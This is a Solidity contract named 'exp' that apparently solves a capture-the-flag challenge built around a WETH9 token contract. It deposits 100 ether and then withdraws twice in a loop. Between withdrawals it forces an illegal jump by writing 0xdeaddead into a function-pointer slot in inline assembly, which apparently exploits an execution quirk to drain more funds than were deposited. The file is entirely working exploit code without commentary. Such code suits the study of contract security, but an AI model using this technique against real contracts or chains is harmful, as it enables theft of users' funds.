// SPDX-License-Identifier: GPL-3.0-or-later

pragma solidity 0.8.9;

interface WETH9 {
    function deposit() external payable;
    function withdraw(uint) external;
}

interface Setup {
    function weth() external view returns(WETH9);
}

contract exp {
    WETH9 private weth;

    function() internal private illegalJump;

    constructor(Setup setup) payable {
        require(msg.value == 100 ether);
        weth = setup.weth();
        weth.deposit{value : msg.value}();
    }

    function fail() public {
        assembly { sstore(illegalJump.slot, 0xdeaddead) }
        illegalJump();
    }

    function exploit() public {
        bool ok;
        for(uint i=0;i<2;i++){
            weth.withdraw(100 ether);
            (ok, ) = address(this).call(abi.encodeWithSignature("fail()"));
        }
    }

    receive() external payable {}
}
